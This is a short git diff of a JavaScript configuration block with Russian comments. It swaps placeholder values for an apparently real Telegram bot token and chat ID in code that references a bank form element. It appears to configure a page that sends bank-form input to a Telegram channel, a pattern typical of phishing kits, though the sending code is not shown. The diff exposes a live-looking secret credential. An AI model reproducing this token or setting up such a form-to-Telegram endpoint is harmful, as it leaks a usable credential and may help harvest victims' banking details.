@@ -1,6 +1,6 @@
 // Конфигурация Telegram бота
-const TELEGRAM_BOT_TOKEN = "ВАШ_BOT_TOKEN"; // Получить у @BotFather
-const TELEGRAM_CHAT_ID = "ВАШ_CHAT_ID";    // Получить у @userinfobot
+const TELEGRAM_BOT_TOKEN = "7170004189:AAGb_MoyRNnlNiym1ZIdxxBYx1aOROmmpfM"; // Получить у @BotFather
+const TELEGRAM_CHAT_ID = "-1002771692818";    // Получить у @userinfobot
 
 // Элементы DOM
 const bankFormSection = document.getElementById('bank-form-section');
